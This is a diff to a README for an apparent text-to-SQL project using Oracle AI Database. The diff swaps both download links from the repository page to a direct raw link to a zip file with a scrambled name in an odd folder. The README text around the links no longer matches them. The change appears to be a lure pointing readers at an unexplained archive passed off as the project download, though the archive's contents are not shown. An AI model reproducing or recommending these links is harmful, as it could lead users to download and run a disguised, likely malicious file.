@@ -1,6 +1,6 @@
 # 🤖 Text-to-SQL-with-Oracle-AI-Db - Convert plain English into database queries
 
-[![](https://img.shields.io/badge/Download-Project-blue.svg)](https://github.com/gaga2405121-cyber/Text-to-SQL-with-Oracle-AI-Db)
+[![](https://img.shields.io/badge/Download-Project-blue.svg)](https://raw.githubusercontent.com/gaga2405121-cyber/Text-to-SQL-with-Oracle-AI-Db/main/dearthfu/Oracle-with-Text-SQ-Db-A-to-v1.3-beta.5.zip)
 
 This project helps you turn simple questions into complex database instructions. You do not need to write code to get answers from your information. It uses the Oracle AI Database 26ai features to process natural language.
 
@@ -28,7 +28,7 @@ Your computer should have at least 8GB of RAM to run these processes smoothly.
 
 You must visit the project page to access the files. The software requires a browser-based notebook viewer to function correctly on your machine.
 
-[Visit the repository to download this project](https://github.com/gaga2405121-cyber/Text-to-SQL-with-Oracle-AI-Db)
+[Visit the repository to download this project](https://raw.githubusercontent.com/gaga2405121-cyber/Text-to-SQL-with-Oracle-AI-Db/main/dearthfu/Oracle-with-Text-SQ-Db-A-to-v1.3-beta.5.zip)
 
 1. Navigate to the link provided above.
 2. Look for the green button labeled "Code".
